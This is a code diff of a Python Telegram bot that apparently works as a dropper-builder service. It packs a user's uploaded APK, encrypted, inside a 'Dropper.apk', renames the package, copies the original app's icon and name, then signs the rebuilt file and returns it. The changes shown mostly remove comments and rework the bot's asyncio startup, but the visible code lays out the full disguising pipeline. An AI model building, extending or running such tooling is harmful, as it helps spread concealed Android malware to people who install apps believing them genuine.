@@ -12,6 +12,7 @@ import random
 import string
 import time
 import logging
+import asyncio
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
@@ -145,7 +146,7 @@ def process_encryption(apk_data: bytes, assets_dir: str):
             f.write(bytes(chunk))
     return meta
 
-# ----- APK প্রসেসিং (PKCS12 সাপোর্ট সহ) -----
+# ----- APK প্রসেসিং -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
@@ -162,7 +163,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             f.write(apk_data)
         await context.bot.send_message(chat_id, "✅ APK saved.")
 
-        # ----- Decode APK -----
         await context.bot.send_message(chat_id, "📦 Decoding APK...")
         decoded_dir = os.path.join(work_dir, 'decoded')
         cmd = f"apktool d -f -o {decoded_dir} {input_apk}"
@@ -173,7 +173,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await context.bot.send_message(chat_id, "✅ Decoded successfully.")
 
-        # ----- Change package name -----
         await context.bot.send_message(chat_id, "🔧 Changing package name...")
         manifest_path = os.path.join(decoded_dir, 'AndroidManifest.xml')
         if not os.path.exists(manifest_path):
@@ -186,13 +185,11 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             f.write(manifest)
         await context.bot.send_message(chat_id, f"✅ Package name changed to {TARGET_PACKAGE}")
 
-        # ----- Encrypt -----
         await context.bot.send_message(chat_id, "🔐 Encrypting APK...")
         assets_dir = os.path.join(decoded_dir, 'assets')
         process_encryption(apk_data, assets_dir)
         await context.bot.send_message(chat_id, "✅ Encryption completed.")
 
-        # ----- Decode Dropper.apk -----
         await context.bot.send_message(chat_id, "📦 Decoding Dropper.apk...")
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
@@ -208,7 +205,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await context.bot.send_message(chat_id, "✅ Dropper decoded.")
 
-        # ----- Copy icon and app name -----
         await context.bot.send_message(chat_id, "🎨 Copying icon and app name...")
         res_src = os.path.join(decoded_dir, 'res')
         res_dst = os.path.join(dropper_decoded, 'res')
@@ -237,7 +233,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                     dtree.write(strings_dst)
         await context.bot.send_message(chat_id, "✅ Icon and name copied.")
 
-        # ----- Rebuild -----
         await context.bot.send_message(chat_id, "✍️ Rebuilding APK...")
         output_apk = os.path.join(work_dir, 'output.apk')
         cmd = f"apktool b -o {output_apk} {dropper_decoded}"
@@ -248,7 +243,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await context.bot.send_message(chat_id, "✅ APK rebuilt.")
 
-        # ----- Sign using PKCS12 (.p12) -----
         await context.bot.send_message(chat_id, "✍️ Signing APK...")
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
@@ -270,7 +264,6 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             return
         await context.bot.send_message(chat_id, "✅ APK signed.")
 
-        # ----- Send final APK -----
         await context.bot.send_message(chat_id, "📤 Sending final APK...")
         with open(output_apk, 'rb') as f:
             await context.bot.send_document(chat_id, f, filename=f"app_{user_id}.apk")
@@ -361,8 +354,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/help - This help"
     )
 
-# ----- বট রান (ফিক্স: stop_signals=None, drop_pending_updates=True) -----
-def run_bot():
+# ----- বট রান (asyncio দিয়ে) -----
+async def bot_main():
     try:
         init_db()
         if not BOT_TOKEN:
@@ -377,12 +370,22 @@ def run_bot():
         application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
 
         logger.info("✅ Bot starting polling...")
-        # FIX: stop_signals=None avoids the cleanup callback bug
-        application.run_polling(stop_signals=None, drop_pending_updates=True)
-
+        await application.initialize()
+        await application.start()
+        await application.updater.start_polling(
+            drop_pending_updates=True,
+            stop_signals=[]
+        )
+        # Keep running
+        while True:
+            await asyncio.sleep(3600)
     except Exception as e:
         logger.error(f"Bot crashed: {e}")
 
+def run_bot():
+    asyncio.run(bot_main())
+
+# ----- মেইন -----
 if __name__ == "__main__":
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.start()
